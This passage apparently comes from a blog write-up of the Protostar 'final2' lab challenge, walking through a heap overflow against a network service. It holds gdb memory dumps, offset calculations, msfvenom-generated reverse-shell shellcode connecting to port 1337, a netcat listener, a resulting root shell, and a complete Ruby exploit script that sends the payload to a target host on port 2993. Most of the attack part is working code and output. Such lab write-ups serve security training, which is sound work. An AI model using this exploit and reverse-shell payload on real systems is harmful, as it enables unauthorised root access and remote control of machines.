<p>[007B:BFFFF8AC]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF8DC : FA 90 04 08  FC F8 FF BF - 05 00 00 00  00 00 00 00 &hellip;&hellip;&hellip;&hellip;&hellip;.
BFFFF8CC : 11 00 20 01  00 00 00 00 - 28 67 E9 B7  08 F9 FF BF .. &hellip;..(g&hellip;&hellip;
BFFFF8BC : B0 FA FF B7  A7 D8 F2 B7 - 01 00 00 00  01 00 00 00 &hellip;&hellip;&hellip;&hellip;&hellip;.
BFFFF8AC : E7 88 04 08  01 00 00 00 - F0 F8 FF BF  26 06 FF B7 &hellip;&hellip;&hellip;&hellip;&amp;&hellip;
[007B:BFFFF91C]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
BFFFF91C : 7B 00 00 00  7B 00 00 00 - 28 67 E9 B7  00 00 00 00 {&hellip;{&hellip;(g&hellip;&hellip;
BFFFF92C : 18 FC FF BF  EC FB FF BF - 11 00 20 01  00 00 00 00 &hellip;&hellip;&hellip;. &hellip;..
[0073:0804E026]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
0x804e026:  cmp    BYTE PTR [ecx+0x61],al
0x804e029:  cmp    DWORD PTR [ecx+0x62],eax
0x804e02c:  xor    BYTE PTR [ecx+0x62],al
0x804e02f:  xor    DWORD PTR [ecx+0x62],eax
0x804e032:  xor    al,BYTE PTR [ecx+0x62]</p>

<h2>0x804e035:  xor    eax,DWORD PTR [ecx+0x62]</h2>

<p>0x0804e026 in ?? ()</p>

<p>gdb> x /50x 0x804e010
0x804e010:  0x61413161  0x33614132  0x0804d410  0x61413561
0x804e020:  0x37614136  0x41386141  0x62413961  0x31624130
0x804e030:  0x41326241  0x62413362  0x35624134  0x41367241
0x804e040:  0x62413762  0x39624138  0x41306341  0x63413163
0x804e050:  0x33634132  0x41346341  0x63413563  0x37634136
0x804e060:  0x41386341  0x64413963  0x3584d130  0x41326449
0x804e070:  0x64413364  0x35644134  0x41366441  0x64413764
0x804e080:  0x39644138  0x00000084  0xfffffff8  0xfffffffc
0x804e090:  0x0804d410  0x0804e010  0x58585858  0x58585858
0x804e0a0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0b0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0c0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0d0:  0x58585858  0x58585858
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413161
[<em>] Exact match at offset 4
root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413561
[</em>] Exact match at offset 16
root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x39644138
[*] Exact match at offset 116
{% endcodeblock %}</p>

<p>Our code starts at pattern offset <code>4</code>. There is also modification in the first <code>12</code> bytes, we use <code>2</code> bytes instruction and skip next <code>10</code> bytes, using <code>\xeb\x0a</code> opcode.</p>

<p>After another segfault, we have in gdb:
{% codeblock %}
root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627</p>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + &ldquo;a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0&rdquo; + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993</p>

<p>gdb> x /i 0x804e010
0x804e010:  jmp    0x804e01c</p>

<p>gdb> x /30x 0x804e01c
0x804e01c:  0x61413561  0x37614136  0x41386141  0x62413961
0x804e02c:  0x31624130  0x41326241  0x62413362  0x35624134
0x804e03c:  0x41366241  0x62413762  0x39624138  0x41306341
0x804e04c:  0x63413163  0x33634132  0x41346341  0x63413563
0x804e05c:  0x37634136  0x41386341  0x64413963  0x31644130
0x804e06c:  0x41326441  0x64413364  0x35644134  0x41366441
0x804e07c:  0x64413764  0x39644138  0x00000084  0xfffffff8
0x804e08c:  0xfffffffc  0x0804d410</p>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + &ldquo;D&rdquo; * 107&#8221; + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993</p>

<p>gdb> x /30x 0x804e01c
0x804e01c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e02c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e03c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e04c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e05c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e06c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e07c:  0x44444444  0x44444444  0x00000084  0xfffffff8
0x804e08c:  0xfffffffc  0x0804d410
{% endcodeblock %}</p>

<p>We can see above, that we have <code>26*4=104</code> bytes for our shellcode.</p>

<p>Exploitation:
{% codeblock %}</p>

<h1>window 1:</h1>

<h1>we add 0x5c = &lsquo;/&rsquo; to our bad chars list</h1>

<p>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &lsquo;\x0a\x0d\x5c\x00&rsquo; -f sh
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 22 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
Payload size: 95 bytes
export buf=\
$&lsquo;\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9&rsquo;\
$&lsquo;\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb&rsquo;\
$&lsquo;\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f&rsquo;\
$&lsquo;\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16&rsquo;\
$&lsquo;\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6&rsquo;\
$&lsquo;\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8&rsquo;\
$&lsquo;\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62&rsquo;</p>

<h1>window 2:</h1>

<p>user@protostar:/tmp$ export buf=\</p>

<blockquote><p>$&lsquo;\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9&rsquo;\
$&lsquo;\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb&rsquo;\
$&lsquo;\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f&rsquo;\
$&lsquo;\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16&rsquo;\
$&lsquo;\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6&rsquo;\
$&lsquo;\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8&rsquo;\
$&lsquo;\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62&rsquo;</p></blockquote>

<h1>window 3:</h1>

<p>user@protostar:~$ nc -l -p 1337</p>

<h1>window 2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + ENV[&ldquo;buf&rdquo;] + &ldquo;D&rdquo; * (107 - ENV[&ldquo;buf&rdquo;].length) + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993
Process OK</p>

<h1>window 3:</h1>

<p>id
uid=0(root) gid=0(root) groups=0(root)
{% endcodeblock %}</p>

<p>{% codeblock lang:ruby exploit-final2.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>require &lsquo;socket&rsquo;</p>

<h1>user@protostar:~$ objdump -TR /opt/protostar/bin/final2 | grep &ldquo;R_386_JUMP_SLOT.* write&rdquo;</h1>

<h1>0804d41c R_386_JUMP_SLOT   write</h1>

<h1>gdb> print /x 0x0804d41c-0xc</h1>

<h1>$1 = 0x804d410</h1>

<h1>root@protostar:/tmp# ltrace  -e memset -f /opt/protostar/bin/final2</h1>

<h1>[pid 2803] +++ exited (status 0) +++</h1>

<h1>[pid 2804] memset(0xbffff71c, &lsquo;\000&rsquo;, 16)     = 0xbffff71c</h1>

<h1>[pid 2807] memset(0x0804e008, &lsquo;\000&rsquo;, 132)    = 0x0804e008 &lt;= first chunk</h1>

<h1>[pid 2807] memset(0x0804e090, &lsquo;\000&rsquo;, 132)    = 0x0804e090 &lt;= second chunk</h1>

<h1>[pid 2807] memset(0x0804e118, &lsquo;\000&rsquo;, 132)    = 0x0804e118 &lt;= third chunk</h1>

<h1>root@kali32:~# ruby -e &lsquo;puts &ldquo;0x&rdquo;+(0x0804e008+&ldquo;FSDRAa0A&rdquo;.length).to_s(16)&rsquo;</h1>

<h1>0x804e010</h1>

<h1>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &lsquo;\x0a\x0d\x5c\x00&rsquo; -f ruby</h1>

<h1>No platform was selected, choosing Msf::Module::Platform::Linux from the payload</h1>

<h1>No Arch selected, selecting Arch: x86 from the payload</h1>

<h1>Found 22 compatible encoders</h1>

<h1>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</h1>

<h1>x86/shikata_ga_nai succeeded with size 95 (iteration=0)</h1>

<h1>Payload size: 95 bytes</h1>

<p>buf =
&ldquo;\xbf\x9e\x53\x7d\x18\xda\xc5\xd9\x74\x24\xf4\x5e\x33\xc9&rdquo; +
&ldquo;\xb1\x12\x31\x7e\x12\x83\xee\xfc\x03\xe0\x5d\x9f\xed\x2d&rdquo; +
&ldquo;\xb9\xa8\xed\x1e\x7e\x04\x98\xa2\x09\x4b\xec\xc4\xc4\x0c&rdquo; +
&ldquo;\x9e\x51\x67\x33\x6c\xe1\xce\x35\x97\x89\xaf\xc5\x67\x48&rdquo; +
&ldquo;\x38\xc4\x67\x4f\x81\x41\x86\xff\x97\x01\x18\xac\xe4\xa1&rdquo; +
&ldquo;\x13\xb3\xc6\x26\x71\x5b\xf6\x09\x05\xf3\x60\x79\x8b\x6a&rdquo; +
&ldquo;\x1f\x0c\xa8\x3e\x8c\x87\xce\x0e\x39\x55\x90&rdquo;</p>

<p>chunk1 = &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + buf + &ldquo;D&rdquo; * (107 - buf.length) + &ldquo;/&rdquo;
chunk2 = &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  103
chunk3 = &ldquo;DDDD&rdquo;</p>

<p>exploit = chunk1 + chunk2 + chunk3</p>

<p>host = ARGV[0]
host ||= &ldquo;192.168.80.154&rdquo;</p>

<p>puts &ldquo;Using host: #{host}&rdquo;</p>

<p>s = TCPSocket.new host, 2993
s.puts(exploit)
s.close
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
